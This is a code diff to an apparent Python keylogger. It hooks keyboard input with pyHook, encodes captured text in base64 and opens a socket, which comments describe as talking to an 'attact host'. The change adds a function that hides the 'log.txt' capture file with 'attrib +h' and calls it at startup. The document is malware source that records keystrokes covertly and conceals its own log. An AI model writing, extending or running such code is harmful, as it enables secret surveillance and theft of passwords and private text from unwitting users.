@@ -1,4 +1,4 @@
-import pyHook, pythoncom, socket
+import pyHook, pythoncom, socket,os
 import threading
 from src import base64cipher
 ##create a server how lisen the attact host
@@ -7,7 +7,13 @@ from src import base64cipher
 # server.bind("127.0.0.1", 5555)
 # server.listen(1)
 # c,a = server.accept()
-filepath=""
+filepath="log.txt"
+#turn file to hidden
+def hide():
+    p = os.popen('attrib +h ' + filepath)
+    t = p.read()
+    p.close()
+
 def opensocket():
 
 
@@ -33,6 +39,7 @@ def encodeTXT(s):
     return base64cipher.encodeMsg(s)
 
 def start():
+    hide()
     opensocket()
     hm = pyHook.HookManager()
     hm.HookKeyboard()
